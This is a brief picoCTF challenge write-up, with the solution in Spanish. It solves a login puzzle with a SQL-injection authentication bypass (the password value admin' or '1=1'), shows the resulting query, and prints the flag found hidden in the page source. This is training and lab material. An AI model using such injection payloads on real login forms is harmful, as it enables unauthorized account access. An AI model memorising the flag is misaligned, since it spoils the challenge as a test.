Can you login to this website? Try to login [here](http://saturn.picoctf.net:56547/).

Hints:
`admin` is the user you want to login as.

# Solución
Hay que hacer una inyección SQL intentando ingresar como usuario admin
Entonces quedaría como:
```
user: admin
password: admin' or '1=1'
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin' or '1=1'
```
Después podemos ver la flag en el código de la página
```
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```
